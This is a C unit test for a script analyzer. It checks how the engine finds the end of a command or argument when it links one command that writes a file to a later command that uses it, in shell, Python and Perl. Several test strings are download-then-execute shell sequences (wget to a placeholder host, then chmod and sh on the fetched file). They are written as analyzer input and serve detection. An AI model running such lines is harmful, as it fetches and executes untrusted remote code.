/*
 * diag_text_ident_edges (unit: it needs the engine's string functions, kof_script_apply, for `.replace(..)`) - the EDGES of what a node's arguments are, in the pass that links two nodes naming one file (diag_text_ident.c): where a command's arguments end, and
 * where one argument of a call ends. The generator test (diag_text_ident_gen.c) writes every command on a line of its own with a newline after it, so a command's end was always the
 * end of its line; the three jump tables that give "the end" in O(1) (stop, comma) had mutants no test killed (mutants.out). Each case below is a text, and the shared links
 * (role PATH) the language says it has - the maker of a file, then whoever names it next:
 *
 *   stop   the last command of a text with no line break after it still has its words (the end of the text is a stop); a pipe, `&` and `;` end a command, so what follows is the NEXT
 *          command's: `chmod +x /opt/w/a | sh /opt/w/b` holds /opt/w/a in chmod and /opt/w/b in sh (chmod's last file is /opt/w/a, not the one after the pipe);
 *   comma  an argument ends at the first comma a bracket does not hide: `os.chmod('/opt/w/b'.replace('x', 'y'), 493)` has the path as its FIRST argument, whose own brackets hold a comma.
 *
 * usage: diag_text_ident_edges
 */

#include <stdio.h>
#include <string.h>
#include <stdint.h>

#include <phenotype/diag_scan.h>
#include <celllysis/nucleo.h>
#include <textual/textual.h>

#include "../../libkofeng/analyzers/parsers/scripts/script_apply.h"

static int fails;

#define CK(c, ...) do { if (!(c)) { printf("  FAIL %s:%d  ", __FILE__, __LINE__); printf(__VA_ARGS__); printf("\n"); fails++; } } while (0)

/* the shared (role PATH) links of the scan of `src`: how many in all, and whether a node of capability `to` has one from a node of capability `from` */
struct paths {
	unsigned n_nodes, n_links;
	char     pairs[16][2][32];
	unsigned n_pairs;
};

static void paths_of(uint32_t lang, const char *src, struct paths *r)
{
	struct kgenome_diag_text_req rq = { .base = (const uint8_t *)src, .size = strlen(src), .lang = lang, .apply = kof_script_apply };
	struct kgenome_diag_scan *s = kgenome_diag_scan_text(&rq);
	uint32_t i, k;

	memset(r, 0, sizeof *r);
	if (!s)
		return;
	r->n_nodes = kgenome_diag_scan_count(s);
	for (i = 0; i < r->n_nodes; i++) {
		const struct kgenome_diag_hit *h = kgenome_diag_scan_at(s, i);

		for (k = 0; k < h->n_in; k++)
			if (h->in[k].kind == KGENOME_DIAG_KIND_SHARED && h->in[k].role == KGENOME_DIAG_ROLE_PATH) {
				r->n_links++;
				if (r->n_pairs < 16u) {
					snprintf(r->pairs[r->n_pairs][0], 32, "%s", kgenome_nucleo_cap_name(kgenome_diag_scan_at(s, h->in[k].from)->cap));
					snprintf(r->pairs[r->n_pairs][1], 32, "%s", kgenome_nucleo_cap_name(h->cap));
					r->n_pairs++;
				}
			}
	}
	kgenome_diag_scan_free(s);
}

static int has(const struct paths *r, const char *from, const char *to)
{
	unsigned k;

	for (k = 0; k < r->n_pairs; k++)
		if (!strcmp(r->pairs[k][0], from) && !strcmp(r->pairs[k][1], to))
			return 1;
	return 0;
}

static void show(const struct paths *r)
{
	unsigned k;

	printf("    %u nodes, %u shared links:", r->n_nodes, r->n_links);
	for (k = 0; k < r->n_pairs; k++)
		printf(" %s -> %s;", r->pairs[k][0], r->pairs[k][1]);
	printf("\n");
}

#define SH KGENOME_TEXTUAL_LANG_SH
#define PY KGENOME_TEXTUAL_LANG_PY
#define PL KGENOME_TEXTUAL_LANG_PERL

int main(void)
{
	struct paths r;

	/* stop: the end of the text is the end of the last command */
	paths_of(SH, "wget -q -O /opt/w/a http://h/x\nsh /opt/w/a", &r);
	CK(r.n_links == 1u, "no line break after the last command: the maker links to it, once (%u links)", r.n_links);
	if (r.n_links != 1u)
		show(&r);
	paths_of(SH, "wget -q -O /opt/w/a http://h/x\nsh /opt/w/a\n", &r);
	CK(r.n_links == 1u, "the same with the line break (%u links)", r.n_links);
	/* stop: a pipe ends a command; chmod's file is the one before it, and sh's is the one after */
	paths_of(SH, "wget -q -O /opt/w/b http://h/x\nchmod +x /opt/w/a | sh /opt/w/b\n", &r);
	CK(r.n_links == 1u, "a pipe ends chmod's arguments: one link, from the maker to sh (%u links)", r.n_links);
	if (r.n_links != 1u)
		show(&r);
	paths_of(SH, "wget -q -O /opt/w/b http://h/x\nchmod +x /opt/w/a & sh /opt/w/b\n", &r);
	CK(r.n_links == 1u, "& ends a command too (%u links)", r.n_links);
	paths_of(SH, "wget -q -O /opt/w/b http://h/x\nchmod +x /opt/w/a && sh /opt/w/b\n", &r);
	CK(r.n_links == 1u, "&& ends a command too (%u links)", r.n_links);
	paths_of(SH, "wget -q -O /opt/w/b http://h/x ; chmod +x /opt/w/a ; sh /opt/w/b", &r);
	CK(r.n_links == 1u, "and so does a semicolon, with no line break at all (%u links)", r.n_links);
	/* comma: the end of one argument is the first comma a bracket does not hide (python and perl, vbs, sh, bat, powershell are the languages that have the path pass: diag_text_stages.c) */
	paths_of(PY, "import os\nos.rename('/opt/w/a', '/opt/w/b')\nos.chmod('/opt/w/b'.replace('x', 'y'), 493)\n", &r);
	CK(r.n_links == 1u, "a comma inside a call's own brackets does not end the argument it is in (%u links)", r.n_links);
	if (r.n_links != 1u)
		show(&r);
	paths_of(PY, "import os\nos.rename('/opt/w/a'.replace('x', 'y'), '/opt/w/c')\nos.chmod('/opt/w/c', 493)\n", &r);
	CK(r.n_links == 1u, "the argument after one whose brackets hold a comma is read from its own start (%u links)", r.n_links);
	if (r.n_links != 1u)
		show(&r);
	paths_of(PY, "import os\nos.rename('/opt/w/a', '/opt/w/c')\nos.chmod('/opt/w/c', 493, 1)\nos.chmod('/opt/w/c', 1)\n", &r);
	CK(r.n_links == 2u, "an argument followed by others is read up to its comma (%u links)", r.n_links);
	/* stop: a statement call with no bracket, in a language that ends a statement with ";" and not with a line break, is the last thing in a text that has no ";" after it: its words end where the text does */
	paths_of(PL, "rename('/opt/w/a', '/opt/w/c');\nunlink '/opt/w/c'", &r);
	CK(r.n_links == 1u, "perl: the last statement call, no semicolon and no line break after it (%u links)", r.n_links);
	paths_of(PL, "rename('/opt/w/a', '/opt/w/c');\nunlink '/opt/w/c';", &r);
	CK(r.n_links == 1u, "perl: the same with the semicolon (%u links)", r.n_links);
	paths_of(PL, "rename('/opt/w/a', '/opt/w/c'); chmod(0755, '/opt/w/c');\n", &r);
	CK(r.n_links == 1u, "perl: two arguments, the path last (%u links)", r.n_links);
	printf("diag_text_ident_edges: %s\n", fails ? "FAILED" : "ok");
	return fails != 0;
}
